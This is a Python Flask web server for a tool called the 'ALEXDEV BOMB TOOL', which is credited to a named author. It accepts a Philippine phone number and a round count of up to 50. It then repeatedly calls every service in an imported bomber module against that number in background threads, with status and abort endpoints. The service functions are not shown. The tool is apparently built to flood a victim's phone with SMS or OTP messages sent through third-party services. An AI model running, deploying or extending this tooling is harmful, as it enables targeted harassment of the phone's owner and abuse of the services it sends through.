#!/usr/bin/env python3
"""
ALEXDEV BOMB TOOL — Web Server
Author: Alex Jhon Ponce
Telegram: https://t.me/alexdevyuhhh
Facebook: https://www.facebook.com/alexdevyuhhh
"""

import uuid
import time
import threading
from flask import Flask, render_template, request, jsonify
from bomber import BomberTool

app = Flask(__name__)
jobs: dict = {}
jobs_lock = threading.Lock()


def run_job(job_id: str, phone: str, rounds: int):
    tool = BomberTool()
    services = tool.all_services
    total = len(services) * rounds

    with jobs_lock:
        jobs[job_id].update({'total': total, 'status': 'running'})

    for round_num in range(1, rounds + 1):
        for service_name, service_fn in services:
            with jobs_lock:
                if jobs[job_id].get('abort'):
                    jobs[job_id]['status'] = 'aborted'
                    return
            try:
                success, message = service_fn(phone)
            except Exception as e:
                success, message = False, str(e)[:60]

            entry = {
                'service': service_name,
                'success': success,
                'message': message,
                'round': round_num,
                'ts': time.strftime('%H:%M:%S')
            }
            with jobs_lock:
                jobs[job_id]['results'].append(entry)
                if success:
                    jobs[job_id]['success'] += 1
                else:
                    jobs[job_id]['fail'] += 1

    with jobs_lock:
        jobs[job_id]['status'] = 'done'


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/bomb', methods=['POST'])
def start_bomb():
    body = request.get_json(silent=True) or {}
    phone = body.get('phone', '').strip()
    rounds = max(1, min(int(body.get('rounds', 1)), 50))

    tool = BomberTool()
    if not tool.validate_phone(phone):
        return jsonify({'error': 'Invalid Philippine number. Use 09XXXXXXXXX format.'}), 400

    job_id = str(uuid.uuid4())
    with jobs_lock:
        jobs[job_id] = {
            'status': 'running',
            'phone': phone,
            'rounds': rounds,
            'results': [],
            'success': 0,
            'fail': 0,
            'total': 0,
            'abort': False
        }

    t = threading.Thread(target=run_job, args=(job_id, phone, rounds), daemon=True)
    t.start()
    return jsonify({'job_id': job_id})


@app.route('/api/status/<job_id>')
def get_status(job_id):
    with jobs_lock:
        job = jobs.get(job_id)
    if not job:
        return jsonify({'error': 'Job not found'}), 404
    return jsonify(job)


@app.route('/api/abort/<job_id>', methods=['POST'])
def abort_job(job_id):
    with jobs_lock:
        if job_id in jobs:
            jobs[job_id]['abort'] = True
    return jsonify({'ok': True})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
